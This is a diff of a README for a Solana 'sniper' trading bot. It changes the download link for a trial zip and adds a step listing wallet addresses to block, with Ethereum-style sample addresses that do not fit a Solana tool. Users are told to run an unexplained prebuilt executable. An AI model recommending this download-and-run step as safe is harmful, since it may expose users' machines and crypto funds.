@@ -60,7 +60,7 @@ src/
 ```
 ---
 ## Trial Version
-🗂️ [solana-raypump-sniper(trial).zip](https://github.com/user-attachments/files/18739104/solana-raypump-sniper.trial.zip)
+🗂️ [solana-raypump-sniper(trial).zip](https://github.com/user-attachments/files/18739348/solana-raypump-sniper.trial.zip)
 
 ### How To Run
 1. Environment Variables Settings
@@ -80,7 +80,12 @@ JITO_TIP_VALUE=0.004
 BUY_THRESHOLD=1000
 SELL_THRESHOLD=300
 ```
-2. Run `raypump-bot.exe`.
+2. Add the wallet address you want to block on a new line and save the file.
+```
+0x1234567890abcdef1234567890abcdef12345678
+0xabcdef1234567890abcdef1234567890abcdef12
+```
+3. Run `raypump-bot.exe`.
 
 ![image](https://github.com/user-attachments/assets/dffc8e4b-cd00-4921-8488-e25230f4a31a)
 
